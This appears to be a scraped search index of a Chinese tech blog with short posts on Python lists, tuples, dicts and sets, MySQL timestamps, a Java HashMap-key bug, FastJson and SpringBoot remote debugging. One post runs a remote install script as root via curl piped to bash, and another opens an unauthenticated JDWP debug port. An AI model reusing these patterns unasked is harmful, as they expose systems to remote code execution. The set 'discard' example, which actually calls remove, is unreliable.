2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/20/190320-Python-常见数学函数/"},{"title":"190321 Python 列表常用函数","text":"接下来介绍几个使用的函数，可以方便的统计列表中的一些信息 len max min list 1. len获取列表长度 123&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; len(a)3 2. max获取列表中最大元素 12&gt;&gt;&gt; max(a)3 3. min获取列表中最小的元素 12&gt;&gt;&gt; min(a)1 4. list将元组转换为list 12&gt;&gt;&gt; list((1,2,3))[1, 2, 3] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/21/190321-Python-列表常用函数/"},{"title":"190321 Python 列表内置方法","text":"List内置了一些方法，可以极大的减少我们的工作量，比如查找元素，删除指定元素，追加等，接下来逐一介绍 1. append在列表末尾添加新的对象 1234&gt;&gt;&gt; a = [2,1,4]&gt;&gt;&gt; a.append(5)&gt;&gt;&gt; a[2, 1, 4, 5] 2. count统计某个元素出现的次数 123&gt;&gt;&gt; a = [2,1,3,2]&gt;&gt;&gt; a.count(2)2 3. index查询列表中某个值的第一个下标 12345678910&gt;&gt;&gt; a = [2,1,3,2]2&gt;&gt;&gt; a.index(2)0&gt;&gt;&gt; a.index(2, 1)3&gt;&gt;&gt; a.index(9)Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;ValueError: 9 is not in list 逐一第二个参数，表示从这个下标开始往后找，如果没有找到会抛异常哦 4. insert将对象插入列表, list.insert(index, obj)， 第一个参数为插入的位置，第二个为插入的元素；如果index大于列表长度，则表示在末尾添加 1234567&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; a.insert(4,1)&gt;&gt;&gt; a[1, 2, 3, 1]&gt;&gt;&gt; a.insert(2, 10)&gt;&gt;&gt; a[1, 2, 10, 3, 1] 5. 删除删除列表中第一个匹配的值 12345678&gt;&gt;&gt; a = [1,2,3, 2]&gt;&gt;&gt; a.remove(2)&gt;&gt;&gt; a[1, 3, 2]&gt;&gt;&gt; a.remove(10)Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;ValueError: list.remove(x): x not in list 如果删除一个不存在的，会抛异常 6. pop移除列表中的一个元素，默认是最后一个，然后返回这个值 123456789&gt;&gt;&gt; a = [1,2,3,4,3]&gt;&gt;&gt; a.pop()3&gt;&gt;&gt; a[1, 2, 3, 4]&gt;&gt;&gt; a.pop(1)2&gt;&gt;&gt; a[1, 3, 4] 7. 清空1234&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; a.clear()&gt;&gt;&gt; a[] 8. 反转将列表中的元素掉个个 1234&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; a.reverse()&gt;&gt;&gt; a[3, 2, 1] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/21/190321-Python-列表内置方法/"},{"title":"190321 Python 列表","text":"list作为python原生支持的数据结构，本文简单介绍它的一些基本知识 1. 创建直接用中括号来创建列表 123&gt;&gt;&gt; l = [1,2,3]&gt;&gt;&gt; l[1, 2, 3] 2. 访问完全可以向数组下标访问模式一样访问列表中元素 1234&gt;&gt;&gt; l[2]3&gt;&gt;&gt; l[-1]3 请注意，如果index为负数，表示从后往前进行定位 3. 更新直接赋值更新 12345&gt;&gt;&gt; l[2] = 10&gt;&gt;&gt; l[2]10&gt;&gt;&gt; l[1, 2, 10] 4. 删除使用del函数来删除数组中的元素 1234&gt;&gt;&gt; del(l[1])&gt;&gt;&gt; l[1, 10]&gt;&gt;&gt; II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/21/190321-Python-列表/"},{"title":"190321 Python 列表截取与拼接","text":"前面一篇介绍了两个列表相加，可以得到一个大的列表，那么还有其他的方式实现列表拼接么? 其次列表的拆分又可以怎么做呢? 1. 截取使用[a:b]的方式来截取列表中的部分数据 12345&gt;&gt;&gt; l = [1,2,3,4,5,6,7,8,9]&gt;&gt;&gt; l[1:5][2, 3, 4, 5]&gt;&gt;&gt; l[2:-2][3, 4, 5, 6, 7] 2. 拼接直接使用+来实现两个列表的拼接，得到一个新的列表；此外，还可以借助extend来实现，将另一个列表合并在当前列表的尾部 1234567&gt;&gt;&gt; a = [1,2]&gt;&gt;&gt; b=[5,4]&gt;&gt;&gt; a + b[1, 2, 5, 4]&gt;&gt;&gt; a.extend(b)&gt;&gt;&gt; a[1, 2, 5, 4] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/21/190321-Python-列表截取与拼接/"},{"title":"190321 Python 列表排序","text":"在上一篇介绍list的内置方法中，并没有把排序丢进去，这里单独进行说明，本身的用法并不复杂，只不过需要注意一下，列表中的元素类型可以不一样，所以排序是否能适用，需要多多考虑 语法 1list.sort( key=None, reverse=False) key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。 reverse – 排序规则，reverse = True 降序， reverse = False 升序（默认） 实例 1234567&gt;&gt;&gt; aList = ['Google', 'Runoob', 'Taobao', 'Facebook']&gt;&gt;&gt; aList.sort()&gt;&gt;&gt; aList['Facebook', 'Google', 'Runoob', 'Taobao']&gt;&gt;&gt; aList.sort(reverse=True)&gt;&gt;&gt; aList['Taobao', 'Runoob', 'Google', 'Facebook'] 接下来看一下指定key的排序实例 12345678&gt;&gt;&gt; def takeSecond(elem):... return elem[1]...# 根据元组中的第二个元素进行排序&gt;&gt;&gt; random = [(2, 2), (3, 4), (4, 1), (1, 3)]&gt;&gt;&gt; random.sort(key=takeSecond)&gt;&gt;&gt; random[(4, 1), (2, 2), (1, 3), (3, 4)] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/21/190321-Python-列表排序/"},{"title":"190322 Python 元组截取","text":"元组虽然不支持修改，但是它和list一样，是支持截取操作的，通过[s:e]语法 如 12345&gt;&gt;&gt; a = (1,2,3,4,5,6)&gt;&gt;&gt; a[1:2](2,)&gt;&gt;&gt; a[2:-1](3, 4, 5) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/22/190322-Python-元组截取/"},{"title":"190322 Python 元组","text":"元组与列表的最大区别是它是固定的，不能修改；本文介绍元组的基本知识点 1. 创建123&gt;&gt;&gt; t = (1, 2, 3)&gt;&gt;&gt; t = 1, 2, 3, 4&gt;&gt;&gt; t = (1,) 注意上面的第二个方式，常见于一个函数返回多个值的时候，其实返回的就是一个元组 注意第三个方式，如果元组只有一个值，请加一个逗号，否则… 2. 访问和list一样，通过下标访问 12345&gt;&gt;&gt; t = 1, 2, 3, 4&gt;&gt;&gt; t[1]2&gt;&gt;&gt; t[-1]4 3. 修改与删除不支持… II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/22/190322-Python-元组/"},{"title":"190321 Python 列表脚本操作符","text":"前面一篇介绍了list的基础操作知识，接下来介绍一些有意思的东西，list还可以进行各种运算哦 1. 长度12&gt;&gt;&gt; len([1,2,3])3 2. 组合两个list相加会怎样？ 12&gt;&gt;&gt; [1,2] + [9, 8][1, 2, 9, 8] 3. 重复12&gt;&gt;&gt; [1,2] * 4[1, 2, 1, 2, 1, 2, 1, 2] 4. 判断列表是否包含12&gt;&gt;&gt; 3 in [1, 2, 3]True 5. 迭代123456&gt;&gt;&gt; for x in [1,2,3]:... print(x)...123 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/21/190321-Python-列表脚本操作符/"},{"title":"190322 Python 元组常用函数","text":"四个常用的函数介绍 len max min tuple 1. len计算元组长度 1len((1,2,3)) 2. max获取元组中最大值 1max((1,2,3)) 3. min获取元组中最小值 1min((1,2,3)) 4. tuple列表转元组 1tuple([1,2,3,4]) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/22/190322-Python-元组常用函数/"},{"title":"190323 Python 字典创建方式扩展篇","text":"dict内置方法中，有一个fromkeys，可以用于创建新的字典，以seq序列中的元素作为键，value作为所有键的初始化值 1dict.fromkeys(seq[,value]) 实例如下 12345&gt;&gt;&gt; seq = ('name', 'age', 'sex')&gt;&gt;&gt; dict.fromkeys(seq){'name': None, 'age': None, 'sex': None}&gt;&gt;&gt; dict.fromkeys(seq, 10){'name': 10, 'age': 10, 'sex': 10} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/23/190323-Python-字典创建方式扩展篇/"},{"title":"190323 Python 字典","text":"字典和我们熟悉的map差不多，属于python原生支持的数据结构，本文介绍一下基本使用case 1. 创建123&gt;&gt;&gt; a = {'a': 1, 'b': 2}&gt;&gt;&gt; a{'a': 1, 'b': 2} 空字典，直接使用{}来创建 2. 访问两种访问方式，一个直接使用[key]，但是当key不存在时，会抛异常；另外就是使用get(key)来访问，不存在时，返回空 12345678&gt;&gt;&gt; a = {'a': 1, 'b': 2}&gt;&gt;&gt; a['a']1&gt;&gt;&gt; a['c']Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;KeyError: 'c'&gt;&gt;&gt; a.get('c') 3. 修改or新增直接赋值，存在时修改，不存在时新增 123&gt;&gt;&gt; a['c'] = 10&gt;&gt;&gt; a{'a': 1, 'b': 2, 'c': 10} 4. 删除使用del来删除 123&gt;&gt;&gt; del a['a']&gt;&gt;&gt; a{'b': 2, 'c': 10} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/23/190323-Python-字典/"},{"title":"190322 Python 元组运算符","text":"元组也支持+，*，和list其实差别不大，除了不能修改、删除 1. 长度1len((1,2,3)) 2. 连接1(1,2,3) + (4, 5, 6) 3. 重复1(1,2) * 3 4. 判断是否包含11 in (1,2,3) 5. 遍历12for i in (1,2,3): print(i) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/22/190322-Python-元组运算符/"},{"title":"190323 Python 字典迭代","text":"字典的迭代，常见的有key,value,items三种迭代方式，下面分别予以实例说明 1. key迭代1234567&gt;&gt;&gt; a = {'a': 1, 'b': 2, 'c': 3}&gt;&gt;&gt; for k in a.keys():... print(k)...abc 2. value迭代123456&gt;&gt;&gt; for v in a.values():... print(v)...123 3. items迭代123456&gt;&gt;&gt; for k,v in a.items():... print(k, v)...a 1b 2c 3 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/23/190323-Python-字典迭代/"},{"title":"190318-Python之异常堆栈信息打印","text":"使用python的logging模块进行日志打印，发现堆栈信息总会被吃掉，导致分析问题缺少必要的上下文，搜索一番才发现，原来是使用姿势不对 正确的异常打印方式如下 1logging.exception(e) 也可以在原来的使用姿势上，指定打印堆栈 123logging.info(msg, exc_info=True)logging.warning(msg, exc_info=True)logging.error(msg, exc_info=True) 一个简单的实例如下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/03/18/190318-Python之异常堆栈信息打印/"},{"title":"190323 Python 字典内置方法","text":"Python字典提供了一些内置的方法，可以减少大量的操作 clear: 清空 copy: 拷贝 update: 更新 setdefault: 不存在时，设置默认值 pop: 删除 1. clear清空字典内所有内容 1234&gt;&gt;&gt; a = {'a': 1, 'b': 2}&gt;&gt;&gt; a.clear()&gt;&gt;&gt; a{} 2. copy浅拷贝 12345&gt;&gt;&gt; a = {1: [1,2,3], 2: ['a']}&gt;&gt;&gt; b = a.copy()&gt;&gt;&gt; a[1][2] = 10&gt;&gt;&gt; b{1: [1, 2, 10], 2: ['a']} 请注意上面的a中列表值改变，b中列表也被改变了，所以这个是浅拷贝 3. update接收的参数也是一个字典，将字典参数中的kv更新到当前字典中 12345&gt;&gt;&gt; a = {'a': 1, 'b': 2}&gt;&gt;&gt; b = {'b': 'haha', 'c': 10}&gt;&gt;&gt; a.update(b)&gt;&gt;&gt; a{'a': 1, 'b': 'haha', 'c': 10} 4. setdefault和get类似，不存在时，用默认值；存在时，返回字典中的值 123456789&gt;&gt;&gt; a = {'a': 1, 'b': 2}&gt;&gt;&gt; a.setdefault('c', 10)10&gt;&gt;&gt; a{'a': 1, 'b': 2, 'c': 10}&gt;&gt;&gt; a.setdefault('c', 2)10&gt;&gt;&gt; a{'a': 1, 'b': 2, 'c': 10} 5. pop删除指定key，如果不存在时，抛异常 123456789&gt;&gt;&gt; a = {'a': 1, 'b': 2}&gt;&gt;&gt; a.pop('a')1&gt;&gt;&gt; a{'b': 2}&gt;&gt;&gt; a.pop('c')Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;KeyError: 'c' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/23/190323-Python-字典内置方法/"},{"title":"190326-MySql查询时间戳日期互转","text":"mysql内部提供了时间戳和日期互转的函数方便直接使用 from_unixtime(time_stamp) : 将时间戳转换为日期 unix_timestamp(date) : 将指定的日期或者日期字符串转换为时间戳 一个简单的实例如下 123456789101112131415161718192021222324mysql&gt; select * from Subscribe;+----+------------------+-----------+--------+------------+------------+-------+---------+| id | email | nick | status | created | updated | extra | channel |+----+------------------+-----------+--------+------------+------------+-------+---------+| 1 | bangzewu@126.com | 小灰灰 | 1 | 1523008294 | 1523008294 | | 0 || 2 | test@test.com | 123 | 2 | 1523008453 | 1523008453 | | 0 |+----+------------------+-----------+--------+------------+------------+-------+---------+2 rows in set (0.00 sec)mysql&gt; select from_unixtime(updated) from Subscribe limit 1;+------------------------+| from_unixtime(updated) |+------------------------+| 2018-04-06 17:51:34 |+------------------------+1 row in set (0.00 sec)mysql&gt; select unix_timestamp(from_unixtime(updated)) from Subscribe limit 1;+----------------------------------------+| unix_timestamp(from_unixtime(updated)) |+----------------------------------------+| 1523008294 |+----------------------------------------+1 row in set (0.00 sec) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/03/26/190326-MySql查询时间戳日期互转/"},{"title":"190323 Python 字典注意事项","text":"字典中的每一对元素由kv两个组成，那么这个key有没有什么限定呢？ 比如能不能塞一个None作为key？能不能塞一个list作为可以? 1. key可以为None实例演示一下，None是可以作为key的 123456&gt;&gt;&gt; a = {}&gt;&gt;&gt; a[None] = 12&gt;&gt;&gt; a{None: 12}&gt;&gt;&gt; a[None]12 2. 创建时，出现重复的key我们知道在后续的字典修改时，如果key存在是需改，不存在是新增，那么在创建字典时，出现了重复的key会怎样? 后一个key的值被记录 123&gt;&gt;&gt; a= {'a': 123, 'b': 4, 'a': 3}&gt;&gt;&gt; a{'a': 3, 'b': 4} 3. key必须不可变字典的key，要求不可变，即可用数字，字符串或元组，但是list就不行 1234&gt;&gt;&gt; a = {[1,2]: 1}Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: unhashable type: 'list' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/23/190323-Python-字典注意事项/"},{"title":"190321 Python 列表复制","text":"列表的拷贝，介绍两种常见的方式, copy() 与 [:] 123&gt;&gt;&gt; l = [1,2,3]&gt;&gt;&gt; a = l.copy()&gt;&gt;&gt; b = l[:] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/21/190321-Python-列表复制/"},{"title":"190323 Python 字典常用函数","text":"python字典中提供了以下几个常用的内置函数，本文分别予以介绍 len: 长度 str: 转字符串 type: 判断类型 in: 判断是否包含 1. len获取字典长度 1len({'a': 123, 'b': 456}) 2. str将字典转字符串 1str({'a': 1, 'b': 2}) 3. type判断变量类型 1type({'a': 1}) 4. in判断字典中是否包含某个key，可以直接借助in来处理 1'a' in {'a': 123} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/23/190323-Python-字典常用函数/"},{"title":"190603 Python 集合内置函数","text":"集合内置的函数介绍 add: 添加 clear: 清空 copy: 拷贝 remove/discard: 删除 1. add添加元素到集合，不存在则加入；存在则不操作 12s = {1,2,3}s.add(2) 2. clear清空 12s = {1,2,3}s.clear() 3. copy拷贝 12s = {1, 2, [1,2,3]}a = s.copy() 4. remove删除一个不存在的元素时，会抛异常 12s = {1, 2, 3}s.remove(4) 5. discard删除一个不存在的元素时，不操作 12s = {1, 2, 3}s.remove(4) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/06/03/190325-Python-集合内置函数/"},{"title":"190403-HashMap的key典型错误使用姿势","text":"记录一个非常低级的错误导致的java应用一直fullgc的问题；根本原因就是HashMap的key使用姿势不对 1. 问题记录先捞出有问题的现场代码，之前写了一个简单的工具类，用来保存两个元素，简单的模拟了一下Guava的实现姿势 123456789101112131415public final class ImmutablePair&lt;L, R&gt; { @Getter private final L left; @Getter private final R right; private ImmutablePair(final L l, final R r) { this.left = l; this.right = r; } public static &lt;L, R&gt; ImmutablePair&lt;L, R&gt; of(L left, R right) { return new ImmutablePair&lt;&gt;(left, right); }} 最开始主要是由于某些地方返回结果时，需要返回多个对象，而java并不能像python那么友好的支持这个功能，所以写了上面这个简单的工具类，对返回结果进行一个简单的封装 距离这个工具类写完之后一两个月的时间，突然有个临时需求场景，对于每次的请求，需要做一个简单的内存过滤；如果这次请求距离上次超过5s, 则直接不处理；否则才接受；于是写了下面这段代码 12345678910111213private Map&lt;ImmutablePair&lt;String, Integer&gt;, Long&gt; cache = new HashMap&lt;&gt;();public String process(String k, Integer id) { ImmutablePair key = ImmutablePair.of(k, id); Long last = cache.get(key); long now = System.currentTimeMillis(); if (last == null || now - last &gt; 5000) { cache.put(key, now); return \"new\"; } else { return null; }} 直接看上面这段代码，貌似没有啥问题，然后愉快的跑起来；但是一段时间之后呢？内存疯狂的上涨，且一直在fullgc 简单的测试下上面方法，发现过滤逻辑一直都没有生效 HashMap根据Key获取Value的方式，主要是根据key的hashcode去定位对应的元素位置，然后通过equals方法判断找到的对象是不是我们预期的目标 因为我们最上面的ImmutablePair类，没有覆盖这两个方法，所以是默认的，这个时候equals方法和==是等效的，主要是判断是否为同一个引用，所以上面的key每次都是重新创建对象，当然和缓存的不一致，从而导致每次都不命中，一直往Map里面塞数据，但是又回收不了，所以导致了这个问题 2. 小结 对于HashMap的key对象，务必保证是重写了equals和hashcode方法的 用内存做缓存时，使用guava的cache并设置上限，相对而言是更加优雅的方式 使用HashMap时，尽量指定Map的初始化容量，否则可能出现频繁的扩容；其次就是最好能保证下HashMap的个数，毫无限制的情况下，说不准哪天就暴雷了 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/04/03/190403-HashMap的key典型错误使用姿势/"},{"title":"190325 Python 集合常用方法","text":"简单介绍一下集合的一些常用方法 len: 个数 in: 判断是否存在 max: 最大值 min: 最小值 1. len1len({1,2,3}) 2. in判断集合中是否包含 1'a' in {'a', 1, 2} 3. min最小值 1min({1,2,3}) 4. max最大值 1max({1,2,3}) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/03/25/190325-Python-集合常用方法/"},{"title":"190419-Centos 安装chrome headless并测试","text":"1. 安装命令1sudo curl https://intoli.com/install-google-chrome.sh | bash 安装完毕之后，会提示安装成功，然后查看对应版本 12google-chrome --versiongoogle-chrome-stable --version 2. 简单使用1google-chrome --headless --disable-gpu --screenshot http://spring.hhui.top 3. chrome-driver安装打开连接: http://npm.taobao.org/mirrors/chromedriver/ 查找匹配的版本下载 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/04/19/190419-Centos-安装chrome-headless并测试/"},{"title":"190401-SpringBoot远程debug设置","text":"记录下SpringBoot jar启动方式，开启远程debug的命令 1java -server -Xms512m -Xmx512m -XX:AutoBoxCacheMax=20480 -Xdebug -Xrunjdwp:server=y,transport=dt_socket,address=9999,suspend=n -jar web.jar II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/04/01/190401-SpringBoot远程debug设置/"},{"title":"190424-Python之16进制与10进制转换","text":"最近正好用到了16进制和十进制之间的互转，发现python相比于java而言，有更优雅的实现方式，下面记录一二 16进制转10进制 12s = '0x12da'ans = int(s, 16) 10进制转16进制 1ans = hex(120) 测试输出如下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/04/24/190424-Python之16进制与10进制转换/"},{"title":"190412-FastJson序列化对象中非字符串类型key输出非标准格式json串问题记录","text":"采用fastjson作为项目的json序列化和反序列化工具，遇到一个蛋疼至极的问题, 如Map，key为int，则输出的字符串中，key没有被双引号括起来，导致前端解析失败 1. 问题复现环境相关 12345678jdb1.8&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.45&lt;/version&gt;&lt;/dependency&gt; 测试case 1234567891011@Testpublic void testJson() { Map&lt;Integer, String&gt; ans = new HashMap&lt;&gt;(); ans.put(10, \"hello\"); ans.put(20, \"world\"); System.out.println(\"fastjson: \" + JSON.toJSONString(ans)); Gson gson = new Gson(); System.out.println(\"gson: \" + gson.toJson(ans));} 为了对比，把gson也加进来了，输出结果如下 12fastjson: {20:&quot;world&quot;,10:&quot;hello&quot;}gson: {&quot;20&quot;:&quot;world&quot;,&quot;10&quot;:&quot;hello&quot;} 针对fastjson的输出，js的序列化直接异常 2. 